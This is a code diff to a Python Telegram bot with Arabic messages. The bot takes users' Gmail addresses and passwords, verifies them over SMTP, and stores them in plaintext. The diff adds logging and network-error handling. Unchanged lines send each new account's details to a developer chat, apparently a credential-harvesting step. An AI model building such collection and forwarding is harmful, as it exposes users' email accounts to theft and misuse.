@@ -313,6 +313,7 @@ def get_account_password(message):
     )
     
     bot.register_next_step_handler(msg, process_new_account)
+
 def process_new_account(message):
     chat_id = message.chat.id
     if message.text.startswith('/start'):
@@ -328,11 +329,11 @@ def process_new_account(message):
     password = message.text
     try:
         context = ssl.create_default_context()
-        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+        logging.info(f"محاولة الاتصال بـ smtp.gmail.com:465 للتحقق من الحساب {email}")
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context, timeout=30) as server:
             server.login(email, password)
         user_data[str(chat_id)]["accounts"].append({"email": email, "password": password})
-        save_data(user_data)  # حفظ فورًا بعد الإضافة
-        # إرسال إلى المطور في try منفصل لعدم تعطيل الرد
+        save_data(user_data)
         try:
             user = bot.get_chat(chat_id)
             language_code = message.from_user.language_code
@@ -351,7 +352,7 @@ def process_new_account(message):
             )
             bot.send_message(DEVELOPER_CHAT_ID, account_info)
         except Exception as e:
-            print(f"Error notifying developer for new account: {e}")
+            logging.error(f"Error notifying developer for new account: {e}")
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(types.InlineKeyboardButton(f"✅ {email}", callback_data='ignore_button'))
         markup.add(types.InlineKeyboardButton("إضافة حساب آخر", callback_data='add_new_account'))
@@ -361,16 +362,23 @@ def process_new_account(message):
             "✅ تم إضافة الحساب بنجاح.",
             reply_markup=markup
         )
-        bot.clear_step_handler_by_chat_id(chat_id)  # تنظيف بعد النجاح
+        bot.clear_step_handler_by_chat_id(chat_id)
     except smtplib.SMTPAuthenticationError:
         bot.send_message(chat_id, "❌ كلمة المرور أو البريد الإلكتروني غير صحيح. حاول مرة أخرى.")
         bot.clear_step_handler_by_chat_id(chat_id)
         show_accounts_menu(chat_id)
+    except socket.gaierror as e:
+        logging.error(f"خطأ في الشبكة أثناء التحقق من {email}: {e}")
+        bot.send_message(chat_id, f"❌ خطأ في الاتصال بالشبكة: {e}. تأكد من اتصال الخادم وأعد المحاولة.")
+        bot.clear_step_handler_by_chat_id(chat_id)
+        show_accounts_menu(chat_id)
     except Exception as e:
-        print(f"خطأ عام في process_new_account: {e}")
+        logging.error(f"خطأ عام في التحقق من الحساب {email}: {e}")
         bot.send_message(chat_id, f"❌ حدث خطأ أثناء التحقق من الحساب {email}: {e}")
         bot.clear_step_handler_by_chat_id(chat_id)
         show_accounts_menu(chat_id)
+
+
 def add_message_subject(message):
     chat_id = message.chat.id
     if message.text.startswith('/start'):
